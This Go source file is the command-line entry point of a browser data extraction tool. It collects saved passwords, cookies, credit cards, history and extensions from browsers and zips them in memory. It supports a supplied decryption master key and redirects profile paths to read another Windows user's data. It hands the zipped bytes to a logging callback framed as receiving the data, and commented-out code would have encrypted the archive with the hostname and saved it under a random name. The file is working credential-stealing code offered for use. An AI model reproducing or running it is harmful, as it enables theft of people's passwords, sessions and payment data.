package run

import (
    "archive/zip"
    "bytes"
    "encoding/hex"
    "fmt"
    "github.com/urfave/cli/v2"
    "os"
    "tests/browser"
    "tests/log"
    "tests/utils/fileutil"
    "time"
)

var (
    browserName  string
    outputDir    string
    outputFormat string
    verbose      bool
    compress     bool
    profilePath  string
    isFullExport bool
)

var (
    MasterKey      = ""
    Username       = ""
    LibProfilePath = ""
    LibBrowserName = ""
)

func Execute() {
    app := &cli.App{
        Name:      "tools",
        Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
        UsageText: "[tools -b chrome -f json -dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser",
        Version:   "0.5.0",
        Flags: []cli.Flag{
            &cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
            &cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
            &cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
            &cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
            &cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "json", Usage: "output format: csv|json"},
            &cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
            &cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
        },
        HideHelpCommand: true,
        Action: func(c *cli.Context) error {

            log.LogInfo("start collect data")
            if verbose {
                log.SetVerbose()
                //logger.Default.SetVerbose()
                //logger.Configure(logger.Default)
            }
            if LibProfilePath != "" {
                profilePath = LibProfilePath
                browserName = LibBrowserName
            }

            var masterKeyBytes []byte
            if MasterKey != "" {
                var err error
                masterKeyBytes, err = hex.DecodeString(MasterKey)
                if err != nil {
                    log.Error(err.Error())
                    return err
                }
                log.LogInfo("set master key")
            }
            oldAppdata := ""
            oldUserProfile := ""
            if Username != "" {
                oldAppdata = os.Getenv("APPDATA")
                oldUserProfile = os.Getenv("USERPROFILE")

                os.Setenv("APPDATA", fmt.Sprintf(`C:\Users\%s\AppData\Roaming`, Username))
                os.Setenv("USERPROFILE", fmt.Sprintf(`C:\Users\%s`, Username))
                log.LogInfo("set user profile and appdata for " + Username)
                time.Sleep(time.Second)
                browser.RefreshConfig()
            }

            browsers, err := browser.PickBrowsers(browserName, profilePath)
            if err != nil {
                log.LogErr(fmt.Sprintf("pick browsers error: %s", err.Error()))
                log.Errorf("pick browsers %v", err)
                return err
            } else {
                log.LogSuccess("PickBrowsers success")
            }
            time.Sleep(time.Second)

            outBuffer := bytes.Buffer{}
            zw := zip.NewWriter(&outBuffer)
            for _, b := range browsers {
                log.LogSuccess(fmt.Sprintf("get browsing %s data", b.Name()))

                data, err := b.BrowsingData(isFullExport, masterKeyBytes)
                if err != nil {
                    log.LogErr(fmt.Sprintf("get browsing data error: %s", err.Error()))
                    log.Errorf("get browsing data error %v", err)
                    continue
                }
                data.Output(zw, outputDir, b.Name(), outputFormat)
            }
            zw.Close()
            log.LogInfo("over collect data")

            //host, _ := os.Hostname()
            //out := crypto.AESEncrypt(outBuffer.Bytes(), []byte(host))
            //outName := uuid.New().String()
            log.LogSuccess("recv browser data start")
            b := outBuffer.Bytes()
            log.LogBytes(b, len(b))

            log.LogSuccess("recv browser data success")

            if Username != "" {
                os.Setenv("APPDATA", oldAppdata)
                os.Setenv("USERPROFILE", oldUserProfile)
                log.LogInfo("recovery user profile and appdata")
            }

            time.Sleep(time.Second * 5)

            //if err = os.WriteFile(outName, out, 666); err != nil {
            //    slog.Error("write zip error: ", "err", err)
            //} else {
            //    if tmp, err := filepath.Abs(outName); err == nil {
            //        outName = tmp
            //    }
            //    msg := "save success,out: " + outName
            //    if LogCallback != nil {
            //        LogCallback(1, "save success,out: "+outName, 0)
            //    }
            //    slog.Warn(msg)
            //}

            if compress {
                if err = fileutil.CompressDir(outputDir); err != nil {
                    log.Errorf("compress error %v", err)
                }
                log.Debug("compress success")
            }
            return nil
        },
    }
    err := app.Run(os.Args)
    if err != nil {
        log.LogErr(fmt.Sprintf("run app error %v", err))
    }
}
